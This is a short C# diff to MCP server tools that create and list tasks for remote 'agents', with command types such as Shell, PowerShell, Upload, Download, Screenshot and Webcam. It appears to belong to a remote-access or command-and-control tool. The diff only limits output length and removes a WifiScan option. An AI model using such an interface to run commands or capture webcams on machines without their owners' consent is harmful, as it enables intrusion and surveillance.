@@ -26,7 +26,7 @@ public sealed class TaskTools
             _ => null
         };
         var tasks = await taskService.GetAllAsync(statusFilter, agentId, page, pageSize);
-        return System.Text.Json.JsonSerializer.Serialize(tasks);
+        return McpUtils.Limit(System.Text.Json.JsonSerializer.Serialize(tasks));
     }
 
     [McpServerTool, Description("Get task details by ID")]
@@ -36,14 +36,14 @@ public sealed class TaskTools
     {
         var task = await taskService.GetByIdAsync(taskId);
         if (task == null) return "Task not found";
-        return System.Text.Json.JsonSerializer.Serialize(task);
+        return McpUtils.Limit(System.Text.Json.JsonSerializer.Serialize(task));
     }
 
     [McpServerTool, Description("Create a new task for an agent")]
     public static async Task<string> create_task(
         TaskService taskService,
         [Description("Target agent ID")] string agentId,
-        [Description("Command type: Shell, PowerShell, Upload, Download, Screenshot, Webcam, WifiScan, Kill, Sleep")] string commandType,
+        [Description("Command type: Shell, PowerShell, Upload, Download, Screenshot, Webcam, Kill, Sleep")] string commandType,
         [Description("The command string to execute")] string command,
         [Description("Timeout in seconds (default 60)")] int timeoutSeconds = 60)
     {
